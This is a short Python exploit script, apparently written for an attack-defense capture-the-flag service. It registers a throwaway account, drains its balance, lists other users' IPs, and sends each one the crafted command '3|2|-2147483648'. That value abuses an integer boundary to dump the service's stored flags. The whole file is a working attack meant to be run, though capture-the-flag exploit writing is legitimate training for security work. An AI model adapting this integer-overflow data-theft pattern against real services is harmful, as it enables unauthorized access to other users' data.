#!../venv/bin/python
import sys
sys.path.insert(1, "../")

import requests
from checker import PORT
from service_api import *

with remote(sys.argv[1], PORT) as io:
    skip_welcome_msg(io)

    username = generate_str(7, 30)
    password = generate_str(25, 30)
    register(io, username, password)
    login(io, username, password)

    # zeroing balance
    choose_ip(io, "137.137.137.137")
    for i in range(0, 10):
        buy_ip(io)

    io.sendline(b"4|0|stub")
    io.recvline()
    ips = []
    while True:
        msg = io.recvline(timeout=2)
        if msg == b"":
            break
        tokens = msg.split(b"|", 1)
        ips.append(tokens[1].decode())

    for ip in ips:
        choose_ip(io, ip)
        io.sendline(b"3|2|-2147483648")
        io.recvuntil(b"results:\n")
        flags = io.recv(0x4000).splitlines()
        print(flags)
    exit_(io)
